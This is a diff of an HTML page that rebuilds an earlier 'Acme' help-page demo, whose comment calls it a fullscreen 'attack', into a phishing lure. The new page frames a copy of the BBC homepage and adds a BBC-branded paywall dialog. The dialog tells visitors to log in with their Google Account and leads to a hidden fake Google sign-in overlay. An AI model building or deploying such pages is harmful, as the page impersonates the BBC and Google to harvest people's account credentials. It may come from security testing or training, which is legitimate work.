@@ -1,64 +1,70 @@
 <!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Help Center - Account Settings</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <script type="module" src="./src/main.ts"></script>
-</head>
-
+  <head>
+    <meta charset="UTF-8" />
+    <title>BBC - Homepage</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <script type="module" src="./src/main.ts"></script>
+  </head>
   <body>
-    <!-- Normal benign page -->
     <div id="page-root" class="page-root">
-      <header class="top-bar">
-        <div class="brand">Acme Account Portal</div>
-        <nav class="nav-links">
-          <a href="#" class="nav-link">Dashboard</a>
-          <a href="#" class="nav-link">Security</a>
-          <a href="#" class="nav-link">Billing</a>
-        </nav>
-      </header>
+      <iframe
+        id="news-frame"
+        class="news-frame"
+        src="./BBC.html"
+        title="BBC News homepage"
+        loading="lazy"
+      ></iframe>
 
-      <main class="content">
-        <section class="card">
-          <h1>Account Security Checkup</h1>
-          <p>
-            Use this page to review your account activity, sign-in devices, and
-            security alerts.
+      <div
+        id="paywall-overlay"
+        class="paywall-overlay hidden"
+        hidden
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="paywall-title"
+        aria-describedby="paywall-desc"
+      >
+        <div class="paywall-card">
+          <div class="paywall-brand" aria-hidden="true">
+            <span>B</span><span>B</span><span>C</span>
+          </div>
+
+          <p class="paywall-eyebrow">Breaking news, live and on-demand</p>
+          <h2 id="paywall-title">Want to view this page?</h2>
+          <p class="paywall-copy" id="paywall-desc">
+            Log in with your Google Account to keep reading the latest BBC stories
+            without interruptions or paywalls.
           </p>
 
-          <ul class="info-list">
-            <li>Last sign-in: 2 hours ago</li>
-            <li>Multi-factor authentication: Enabled</li>
-            <li>Recovery email: configured</li>
+          <ul class="paywall-benefits">
+            <li>Unlimited access to top stories and live coverage</li>
+            <li>Personalised updates across all your devices</li>
+            <li>100% free – no credit card required</li>
           </ul>
 
-          <button id="help-button" class="primary-btn">
-            Need help with sign in?
-          </button>
-        </section>
-
-        <!-- Small help popup that will trigger the fullscreen "attack" -->
-        <div id="help-popup" class="help-popup hidden">
-          <div class="help-popup-inner">
-            <h2>Sign in help</h2>
-            <p>
-              If you are having trouble signing in, we can re-check your
-              connected Google account.
-            </p>
-            <div class="help-popup-actions">
-              <button id="help-cancel" class="ghost-btn">Cancel</button>
-              <button id="help-continue" class="primary-btn">
-                Continue
-              </button>
-            </div>
+          <div class="paywall-actions">
+            <button id="paywall-dismiss" class="paywall-secondary">
+              Maybe later
+            </button>
+            <button id="paywall-continue" class="paywall-primary">
+              Login to view for free
+            </button>
           </div>
+
+          <div class="paywall-seal">
+            <span class="paywall-lock" aria-hidden="true"></span>
+            Secure sign-in with Google
+          </div>
+
+          <p class="paywall-note">
+            By continuing, you agree to BBC Terms of Use and Privacy Policy.
+          </p>
         </div>
-      </main>
+      </div>
     </div>
 
-    <!-- Fake Google Sign In fullscreen overlay -->
-    <div id="fake-google-root" class="fake-root hidden">
+    <div id="fake-google-root" class="fake-root hidden" hidden>
       <div class="fake-bg">
         <div class="fake-card">
           <div class="fake-layout">
@@ -108,7 +114,7 @@
                   />
                 </label>
 
-                <button type="button" class="fake-link-btn" id="fake-forgot">
+                <button type="button" class="fake-link-btn">
                   Forgot email?
                 </button>
 
